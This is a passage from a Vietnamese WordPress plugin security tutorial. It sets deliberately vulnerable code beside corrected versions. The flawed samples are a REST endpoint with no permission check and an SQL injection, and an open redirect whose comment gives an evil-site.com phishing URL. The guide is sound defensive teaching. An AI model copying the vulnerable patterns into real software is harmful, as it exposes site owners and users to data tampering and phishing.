    $atts = shortcode_atts( array(
        'role'   => 'author',
        'number' => 10,
    ), $atts, 'good_user_list' );

    // Sanitize và validate
    $allowed_roles = array( 'author', 'editor', 'contributor' );
    $role   = in_array( $atts['role'], $allowed_roles, true ) ? $atts['role'] : 'author';
    $number = min( absint( $atts['number'] ), 50 );  // Tối đa 50

    // Sử dụng WordPress API (không raw SQL)
    $users = get_users( array(
        'role'    => $role,
        'number'  => $number,
        'orderby' => 'display_name',
        'order'   => 'ASC',
    ) );

    $output = '<div class="user-list">';
    foreach ( $users as $user ) {
        $output .= '<div class="user-item">';
        $output .= '<span class="name">' . esc_html( $user->display_name ) . '</span>';
        // KHÔNG hiển thị email cho public
        $output .= '<span class="posts">'
                  . absint( count_user_posts( $user->ID ) )
                  . ' bài viết</span>';
        $output .= '</div>';
    }
    $output .= '</div>';

    return $output;
} );
```

### 15.5. REST API endpoint

```php
<?php
// ==========================================
// SAI - NHIỀU LỖ HỔNG BẢO MẬT
// ==========================================
add_action( 'rest_api_init', function() {
    register_rest_route( 'bad/v1', '/update', array(
        'methods'  => 'POST',
        'callback' => function( $request ) {
            global $wpdb;
            // Không có permission_callback
            // Không validate/sanitize dữ liệu
            $id    = $request['id'];
            $title = $request['title'];
            // SQL Injection
            $wpdb->query( "UPDATE {$wpdb->posts} SET post_title = '{$title}' WHERE ID = {$id}" );
            return array( 'updated' => true );
        },
    ) );
} );

// ==========================================
// ĐÚNG - AN TOÀN
// ==========================================
add_action( 'rest_api_init', function() {
    register_rest_route( 'good/v1', '/update/(?P<id>\d+)', array(
        'methods'             => WP_REST_Server::EDITABLE,
        'callback'            => function( WP_REST_Request $request ) {
            $id    = absint( $request['id'] );
            $title = sanitize_text_field( $request->get_param( 'title' ) );

            if ( empty( $title ) ) {
                return new WP_Error(
                    'missing_title',
                    'Tiêu đề không được để trống.',
                    array( 'status' => 400 )
                );
            }

            $post = get_post( $id );
            if ( ! $post ) {
                return new WP_Error( 'not_found', 'Không tồn tại.', array( 'status' => 404 ) );
            }

            $result = wp_update_post( array(
                'ID'         => $id,
                'post_title' => $title,
            ), true );

            if ( is_wp_error( $result ) ) {
                return $result;
            }

            $updated_post = get_post( $id );
            return new WP_REST_Response( array(
                'id'    => $updated_post->ID,
                'title' => $updated_post->post_title,
            ), 200 );
        },
        'permission_callback' => function( WP_REST_Request $request ) {
            $id = absint( $request['id'] );
            return current_user_can( 'edit_post', $id );
        },
        'args' => array(
            'id' => array(
                'required'          => true,
                'type'              => 'integer',
                'validate_callback' => function( $value ) {
                    return is_numeric( $value ) && $value > 0;
                },
                'sanitize_callback' => 'absint',
            ),
            'title' => array(
                'required'          => true,
                'type'              => 'string',
                'sanitize_callback' => 'sanitize_text_field',
                'validate_callback' => function( $value ) {
                    return ! empty( trim( $value ) );
                },
            ),
        ),
    ) );
} );
```

### 15.6. Redirect an toàn

```php
<?php
// ==========================================
// SAI - Open Redirect
// ==========================================
$redirect = $_GET['redirect_to'];
header( 'Location: ' . $redirect );
// Attacker: ?redirect_to=https://evil-site.com/phishing

// ==========================================
// ĐÚNG - An toàn
// ==========================================

// Cách 1: wp_safe_redirect() - chỉ cho redirect đến cùng domain
$redirect = isset( $_GET['redirect_to'] ) ? esc_url_raw( $_GET['redirect_to'] ) : '';
if ( ! empty( $redirect ) ) {
    wp_safe_redirect( $redirect );
    exit;
}

// Cách 2: Redirect đến URL cố định (không dùng URL từ user input)
wp_safe_redirect( admin_url( 'admin.php?page=my-settings&updated=1' ) );
exit;

// Cách 3: Thêm domain vào allowed list (nếu cần redirect ngoài domain)
add_filter( 'allowed_redirect_hosts', function( $hosts ) {
    $hosts[] = 'trusted-domain.com';
    return $hosts;
} );
```

### 15.7. Tóm tắt 10 quy tắc vàng

```
1.  LUÔN sanitize input    : sanitize_text_field(), absint(), sanitize_email(), ...
2.  LUÔN escape output     : esc_html(), esc_attr(), esc_url(), wp_kses_post(), ...
3.  LUÔN validate data     : Kiểm tra kiểu, khoảng, whitelist
4.  LUÔN dùng nonces       : wp_nonce_field() + wp_verify_nonce()
5.  LUÔN kiểm tra quyền    : current_user_can()
6.  LUÔN dùng prepare()    : $wpdb->prepare() cho tất cả SQL với user input
7.  LUÔN dùng WP API       : get_post(), WP_Query, update_option() thay vì raw SQL
8.  KHÔNG tin user input   : $_GET, $_POST, $_COOKIE, headers, database
9.  KHÔNG hiển thị errors  : WP_DEBUG = false trên production
10. KHÔNG lưu password     : Không bao giờ lưu mật khẩu dạng plain text
```

---

Tài liệu tham khảo:
- WordPress Plugin Security: https://developer.wordpress.org/plugins/security/
- Data Validation: https://developer.wordpress.org/apis/security/data-validation/
- Nonces: https://developer.wordpress.org/apis/security/nonces/
- OWASP WordPress Security: https://owasp.org/www-project-web-security-testing-guide/
